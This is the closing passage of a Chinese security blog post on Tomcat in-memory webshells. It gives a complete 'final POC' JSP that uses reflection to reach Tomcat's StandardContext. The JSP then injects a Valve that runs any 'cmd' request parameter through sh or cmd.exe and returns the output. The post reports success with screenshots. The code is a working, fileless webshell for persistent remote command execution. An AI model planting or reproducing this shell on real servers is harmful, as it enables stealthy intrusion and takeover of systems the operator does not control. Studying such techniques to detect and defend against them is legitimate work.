class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    standardContext.addValve(badValve);</span><br></pre></td></tr></table></figure>



<h6 id="最终POC-3"><a href="#最终POC-3" class="headerlink" title="最终POC"></a>最终POC</h6><p>index.jsp：</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field0</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext)field0.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext)field1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">ValveBase</span> <span class="variable">badValve</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ValveBase</span>() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request req, Response resp)</span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> isLinux ? (Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;).getInputStream()) : (Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;).getInputStream());</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    resp.getWriter().write(o);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">this</span>.getNext().invoke(req, resp);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    standardContext.addValve(badValve);</span><br><span class="line"><span class="comment">//提示注入</span></span><br><span class="line">    out.println(<span class="string">&quot;success inject&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>然后开启服务器即可：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240904160741535.png" alt="image-20240904160741535"></p>
<p>成功执行：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240904160812627.png" alt="image-20240904160812627"></p>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>Fupanc
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://fupanc.github.io/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat内存马">https://fupanc.github.io/2024/09/05/Tomcat内存马/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/08/13/CB%E9%93%BE/" rel="prev" title="CB链">
                  <i class="fa fa-angle-left"></i> CB链
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/09/05/Rome%E9%93%BE/" rel="next" title="Rome链">
                  Rome链 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Fupanc</span>
  </div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">
    <!--由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动 -->
  </div>

    </div>
  </footer>

  
  <script type="text/javascript"
  color="0,0,0" opacity='0.4' zIndex="-2" count="20" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
    

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <a href="https://github.com/yourname" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>





  <script src="/js/third-party/pace.js"></script>


  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
